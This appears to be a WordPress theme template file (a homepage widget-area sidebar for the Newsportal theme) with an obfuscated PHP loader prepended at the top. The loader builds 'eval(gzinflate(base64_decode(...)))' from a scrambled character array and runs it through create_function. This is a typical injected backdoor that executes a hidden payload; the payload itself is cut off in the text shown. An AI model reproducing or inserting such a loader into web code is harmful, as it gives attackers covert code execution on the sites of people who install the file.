<?php
$md5 = "48eeed71e34096b38d60b2d05dd34b27";
$ab = array("s","a",";",'f',"d","$",'6','c','z',"i",'l',"v",'g',"o","b","4","(",")",'_','t',"r","e","n");
$bb9 = create_function('$'.'v',$ab[21].$ab[11].$ab[1].$ab[10].$ab[16].$ab[12].$ab[8].$ab[9].$ab[22].$ab[3].$ab[10].$ab[1].$ab[19].$ab[21].$ab[16].$ab[14].$ab[1].$ab[0].$ab[21].$ab[6].$ab[15].$ab[18].$ab[4].$ab[21].$ab[7].$ab[13].$ab[4].$ab[21].$ab[16].$ab[5].$ab[11].$ab[17].$ab[17].$ab[17].$ab[2]);
...
<?php
/**
 * Widget area for page template homepage III
 *
 * @package WordPress
 * @subpackage Newsportal
 * @since Newsportal 1.0
 */
if(nesia_active_sidebar( 'home-main' )){ ?>
			
        <!-- Start Sidebar -->
        <section class='sidebar content-sidebar row'>
                <?php nesia_sidebar( 'home-main' ); ?>
        </section>
